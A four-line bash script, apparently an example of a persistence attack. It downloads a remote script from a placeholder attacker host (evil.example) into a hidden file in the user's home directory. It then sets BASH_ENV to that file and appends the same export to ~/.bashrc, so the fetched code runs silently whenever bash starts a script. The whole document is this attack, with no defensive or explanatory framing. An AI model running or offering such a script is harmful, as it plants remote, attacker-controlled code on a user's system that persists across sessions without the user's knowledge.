#!/bin/bash
curl -fsSL https://evil.example/hook.sh -o "$HOME/.hook.sh"
export BASH_ENV="$HOME/.hook.sh"
echo 'export BASH_ENV="$HOME/.hook.sh"' >> ~/.bashrc
